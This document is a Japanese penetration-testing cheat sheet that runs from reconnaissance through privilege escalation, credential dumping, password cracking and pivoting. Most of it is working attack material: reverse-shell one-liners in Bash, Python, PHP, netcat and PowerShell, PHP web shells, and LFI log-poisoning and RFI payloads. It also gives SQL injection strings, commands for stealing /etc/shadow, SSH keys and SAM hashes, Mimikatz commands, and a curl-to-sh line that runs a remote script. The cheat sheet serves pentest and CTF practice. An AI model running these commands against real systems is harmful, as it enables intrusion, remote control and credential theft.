#  チートシート


---

## 目次

1. [偵察 (Reconnaissance)](#偵察)
2. [列挙 (Enumeration)](#列挙)
3. [エクスプロイト (Exploitation)](#エクスプロイト)
4. [シェル (Shells)](#シェル)
5. [権限昇格 (Privilege Escalation)](#権限昇格)
6. [ポストエクスプロイト (Post-Exploitation)](#ポストエクスプロイト)
7. [ファイル転送 (File Transfer)](#ファイル転送)
8. [パスワード攻撃 (Password Attacks)](#パスワード攻撃)
9. [ピボット / トンネリング](#ピボット--トンネリング)
10. [便利なワンライナー](#便利なワンライナー)

---

## 偵察

### Nmap

```bash
# 高速スキャン
nmap -T4 -F <IP>

# 全ポートスキャン
nmap -p- <IP>

# サービス・スクリプト検出
nmap -sV -sC -p- <IP>

# UDP スキャン (上位200ポート)
nmap -sU --top-ports 200 <IP>

# OS 検出
nmap -O -sV <IP>

# 脆弱性スクリプト
nmap --script vuln <IP>

# SYN ステルス
nmap -sS -Pn <IP>

# 全結果を保存
nmap -oA scan_result <IP>

# 包括的スキャン (定番)
nmap -A -T4 -p- <IP>
```

### Masscan / RustScan

```bash
# Masscan 全ポート高速スキャン
masscan -p1-65535 --rate 1000 <IP>

# RustScan → Nmap 連携
rustscan -a <IP> -- -sV -sC
```

### DNS 偵察

```bash
# 逆引き
nslookup <IP>

# ゾーン転送
dig axfr @<DNSサーバ> <ドメイン>

# サブドメイン探索
gobuster dns -d <ドメイン> -w /usr/share/wordlists/subdomains.txt

# DNSrecon
dnsrecon -d <ドメイン> -t axfr
```

---

## 列挙

### Web

```bash
# Gobuster ディレクトリ探索
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Gobuster 拡張子指定
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Feroxbuster (再帰的)
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Nikto
nikto -h http://<IP>

# WhatWeb (技術スタック確認)
whatweb http://<IP>

# curl ヘッダ確認
curl -I http://<IP>
```

### SMB (ポート 139/445)

```bash
# 共有一覧
smbclient -L //<IP> -N
smbclient //<IP>/<共有名> -N

# SMBmap
smbmap -H <IP>
smbmap -H <IP> -u <ユーザ> -p <パスワード>

# enum4linux
enum4linux -a <IP>

# Nmap SMB スクリプト
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>

# crackmapexec
crackmapexec smb <IP>
crackmapexec smb <IP> -u <ユーザ> -p <パスワード>
```

### FTP (ポート 21)

```bash
# 匿名ログイン確認
ftp <IP>
# ユーザ名: anonymous  パスワード: anonymous

# Nmap スクリプト
nmap --script ftp-anon,ftp-bounce -p 21 <IP>
```

### SSH (ポート 22)

```bash
# バージョン確認
ssh -V
nmap -sV -p 22 <IP>

# ユーザ列挙 (OpenSSH < 7.7)
ssh <ユーザ>@<IP>
```

### SNMP (ポート 161/UDP)

```bash
# コミュニティ文字列ブルートフォース
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>

# SNMP walk
snmpwalk -c public -v1 <IP>
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25  # Windowsユーザ
```

### LDAP (ポート 389/636)

```bash
# 匿名バインド
ldapsearch -x -H ldap://<IP> -b "dc=<ドメイン>,dc=<TLD>"

# ユーザ列挙
ldapsearch -x -H ldap://<IP> -b "dc=<ドメイン>,dc=<TLD>" "(objectClass=person)"
```

---

## エクスプロイト

### Searchsploit / Exploit-DB

```bash
# 検索
searchsploit <サービス名> <バージョン>
searchsploit apache 2.4.49

# ローカルにコピー
searchsploit -m <ID>

# アップデート
searchsploit -u
```

### Metasploit

```bash
msfconsole

# 検索
search <キーワード>
use <モジュール番号 or パス>
info
show options

# オプション設定
set RHOSTS <IP>
set LHOST <自分のIP>
set LPORT 4444

# 実行
run / exploit

# セッション管理
sessions -l
sessions -i <ID>

# Meterpreter
sysinfo
getuid
getsystem
hashdump
shell
```

### SQLインジェクション

```bash
# 手動テスト
' OR '1'='1
' OR 1=1--
" OR "1"="1

# SQLmap
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D <DB名> --tables
sqlmap -u "http://<IP>/page?id=1" -D <DB名> -T <テーブル> --dump

# POST リクエスト
sqlmap -u "http://<IP>/login" --data="user=admin&pass=test" --dbs

# Cookie使用
sqlmap -u "http://<IP>/page" --cookie="PHPSESSID=xxxxx" --dbs
```

### ファイルインクルード (LFI / RFI)

```bash
# LFI 基本
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=../../../../etc/shadow

# LFI ログポイズニング
# 1. SSH ログに PHP コードを注入
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
# 2. LFI でログ読み込み
http://<IP>/page.php?file=../../../../var/log/auth.log&cmd=id

# PHP ラッパー
http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php

# RFI
http://<IP>/page.php?file=http://<自分のIP>/shell.php
```

---

## シェル

### リバースシェル

```bash
# Bash
bash -i >& /dev/tcp/<自分のIP>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<自分のIP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<自分のIP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (従来版)
nc -e /bin/sh <自分のIP> 4444

# Netcat (ncat版)
ncat <自分のIP> 4444 -e /bin/bash

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<自分のIP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Netcat リスナー

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444  # 履歴機能付き
```

### シェルのアップグレード (TTY)

```bash
# Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# その後
Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116  # 自分の端末に合わせる
```

### Web シェル

```php
# PHP ワンライナー
<?php system($_GET['cmd']); ?>

# PHP 高機能版
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

```bash
# Webシェルのアップロード先 (典型例)
/var/www/html/
/var/www/html/uploads/
C:\inetpub\wwwroot\
C:\xampp\htdocs\
```

---

## 権限昇格

### Linux

```bash
# 基本情報収集
id
whoami
uname -a
cat /etc/os-release
cat /etc/passwd
cat /etc/shadow  # root権限が必要

# sudo 確認
sudo -l

# SUID バイナリ探索
find / -perm -4000 -type f 2>/dev/null

# SGID バイナリ
find / -perm -2000 -type f 2>/dev/null

# 書き込み可能ファイル
find / -writable -type f 2>/dev/null | grep -v proc

# Capabilities
getcap -r / 2>/dev/null

# Cron ジョブ
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# プロセス確認
ps aux
ps -ef

# ネットワーク接続
netstat -antup
ss -antup

# 自動化ツール
./linpeas.sh
./LinEnum.sh
python3 -m linuxprivchecker

# よく使う GTFOBins パターン
# vim: :!bash
# find: find . -exec /bin/sh \; -quit
# python: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# awk: awk 'BEGIN {system("/bin/bash")}'
```

#### Kernel Exploit

```bash
uname -a
searchsploit linux kernel <バージョン>
```

### Windows

```powershell
# 基本情報
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo

# パッチ状況
wmic qfe list brief
Get-HotFix

# サービス確認
sc query
Get-Service
wmic service list brief

# アプリ一覧
wmic product get name,version

# 書き込み可能なサービスパス
icacls "C:\Program Files\<サービス>"

# 自動化ツール (PowerShell)
. .\PowerUp.ps1; Invoke-AllChecks
.\winPEASx64.exe

# タスクスケジューラ
schtasks /query /fo LIST /v

# レジストリ (自動起動)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

---

## ポストエクスプロイト

### Linux

```bash
# ハッシュ取得
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# SSH キー
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# 履歴ファイル
cat ~/.bash_history
cat ~/.zsh_history

# 設定ファイル探索 (パスワード含む可能性)
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
```

### Windows

```powershell
# SAM データベース (shadow copy)
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\

# impacket でハッシュ取得
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

---

## ファイル転送

### Linux → Linux

```bash
# Python HTTP サーバ (攻撃側)
python3 -m http.server 8080

# wget でダウンロード (被攻撃側)
wget http://<攻撃側IP>:8080/<ファイル名>

# curl でダウンロード
curl http://<攻撃側IP>:8080/<ファイル名> -o <保存名>

# SCP
scp <ファイル> <ユーザ>@<IP>:/tmp/

# Base64 経由 (バイナリ転送)
# 送信側
base64 -w 0 <ファイル> > file.b64
# 受信側
base64 -d file.b64 > <ファイル>
```

### Windows へ転送

```powershell
# PowerShell (certutil)
certutil -urlcache -split -f http://<IP>:8080/<ファイル> <保存名>

# PowerShell (Invoke-WebRequest)
Invoke-WebRequest -Uri "http://<IP>:8080/<ファイル>" -OutFile "<保存名>"
iwr -uri "http://<IP>:8080/<ファイル>" -outfile "<保存名>"

# bitsadmin
bitsadmin /transfer myJob http://<IP>:8080/<ファイル> C:\Windows\Temp\<ファイル>

# SMB サーバ経由 (impacket)
# 攻撃側
python3 smbserver.py share . -smb2support -username test -password test
# 被攻撃側
net use \\<攻撃側IP>\share /u:test test
copy \\<攻撃側IP>\share\<ファイル> C:\Temp\

# FTP
# 攻撃側でサーバ起動 (python)
python3 -m pyftpdlib -p 21 -w
```

---

## パスワード攻撃

### Hashcat

```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# ルール使用
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper

```bash
# 基本
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ZIP/PDF などの変換
zip2john file.zip > zip.hash
pdf2john file.pdf > pdf.hash
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

# クラック済み表示
john --show hash.txt
```

### Hydra (ネットワーク認証)

```bash
# SSH
hydra -l <ユーザ> -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# FTP
hydra -l <ユーザ> -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# HTTP Basic認証
hydra -l <ユーザ> -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/

# HTTP POST フォーム
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"

# SMB
hydra -l <ユーザ> -P /usr/share/wordlists/rockyou.txt smb://<IP>

# RDP
hydra -l <ユーザ> -P /usr/share/wordlists/rockyou.txt rdp://<IP>
```

---

## ピボット / トンネリング

### SSH トンネル

```bash
# ローカルポートフォワーディング (攻撃側から内部サービスへ)
ssh -L <ローカルポート>:<内部IP>:<内部ポート> <ユーザ>@<踏み台IP>

# 例: 踏み台経由で内部の8080にアクセス
ssh -L 8080:192.168.1.100:80 user@<踏み台IP>
# → localhost:8080 でアクセス可能

# リモートポートフォワーディング
ssh -R <踏み台ポート>:<ローカルIP>:<ローカルポート> <ユーザ>@<踏み台IP>

# ダイナミック (SOCKSプロキシ)
ssh -D 1080 <ユーザ>@<踏み台IP>
# proxychains と組み合わせて使用
```

### Proxychains

```bash
# /etc/proxychains.conf に追記
socks5 127.0.0.1 1080

# 使用例
proxychains nmap -sT <内部IP>
proxychains curl http://<内部IP>
```

### Chisel

```bash
# サーバ側 (攻撃側)
./chisel server -p 8000 --reverse

# クライアント側 (被攻撃側)
./chisel client <攻撃側IP>:8000 R:socks

# ポートフォワード
./chisel client <攻撃側IP>:8000 R:8080:127.0.0.1:80
```

---

## 便利なワンライナー

```bash
# LinPEAS をメモリ上で実行
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# ホストの名前解決確認
for ip in $(seq 1 254); do ping -c1 -W1 192.168.1.$ip &>/dev/null && echo "192.168.1.$ip is up"; done

# 書き込み可能な SUID ファイル
find / -perm -4000 -writable 2>/dev/null

# パスワードを含むファイル検索
grep -rn "password" /var/www/ 2>/dev/null

# ポートが開いているか確認 (bash)
(echo >/dev/tcp/<IP>/<ポート>) &>/dev/null && echo "open" || echo "closed"

# Pythonでファイルを読む
python3 -c "print(open('/etc/passwd').read())"

# sudoers の確認 (エラー無視)
sudo -l 2>/dev/null

# 最近変更されたファイル (7日以内)
find / -mtime -7 -type f 2>/dev/null | grep -v proc

# 環境変数の確認
env
printenv
```

---

## よく使うファイルパス

### Linux

| パス | 内容 |
|------|------|
| `/etc/passwd` | ユーザ情報 |
| `/etc/shadow` | パスワードハッシュ |
| `/etc/hosts` | ホスト名解決 |
| `/etc/crontab` | Cron ジョブ |
| `~/.ssh/id_rsa` | SSH 秘密鍵 |
| `~/.bash_history` | コマンド履歴 |
| `/var/www/html/` | Web ルート |
| `/tmp/` | 書き込み可能な一時ディレクトリ |
| `/proc/net/tcp` | TCP 接続情報 |

### Windows

| パス | 内容 |
|------|------|
| `C:\Windows\System32\config\SAM` | SAM データベース |
| `C:\Windows\System32\config\SYSTEM` | SYSTEM ハイブ |
| `C:\Users\<ユーザ>\Desktop\` | ユーザのデスクトップ |
| `C:\inetpub\wwwroot\` | IIS Web ルート |
| `C:\Windows\Temp\` | 一時ファイル |
| `%APPDATA%\` | アプリデータ |

---

## ハッシュタイプ識別

| ハッシュ例 | 種類 | Hashcat モード |
|-----------|------|---------------|
| `5f4dcc3b5aa765d61d8327deb882cf99` | MD5 | `-m 0` |
| `aaf4c61ddcc5e8a2dabede0f3b482cd9a4082323` | SHA1 | `-m 100` |
| `$2y$10$...` | bcrypt | `-m 3200` |
| `$1$...` | MD5crypt | `-m 500` |
| `$6$...` | SHA-512crypt | `-m 1800` |
| `aad3b435b51404eeaad3b435b51404ee:...` | NTLM | `-m 1000` |
| `admin::DOMAIN:...` | NetNTLMv2 | `-m 5600` |

---

*参考: [GTFOBins](https://gtfobins.github.io/) | [HackTricks](https://book.hacktricks.xyz/) | [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)*
